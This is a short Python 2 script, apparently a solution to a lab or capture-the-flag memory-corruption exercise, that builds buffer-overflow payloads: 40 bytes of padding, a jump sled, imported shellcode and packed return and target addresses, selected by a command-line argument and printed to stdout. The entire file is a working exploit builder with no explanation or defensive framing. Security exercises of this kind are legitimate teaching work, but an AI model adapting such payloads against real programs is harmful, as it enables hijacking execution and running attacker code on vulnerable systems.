from struct import pack
from shellcode import shellcode
import sys

s = "A"

retadd = 0xbffea0dc
jump_shellcode = "\x90\x90\xeb\x04"

if sys.argv[1] == "1":
  s = "A" * 40 + jump_shellcode
if sys.argv[1] == "2":
  s = shellcode + "A" * (40 - len(shellcode)) + pack("<I", 0x080f3748) + pack("<I", retadd)
if sys.argv[1] == "3":
  s = s

print s

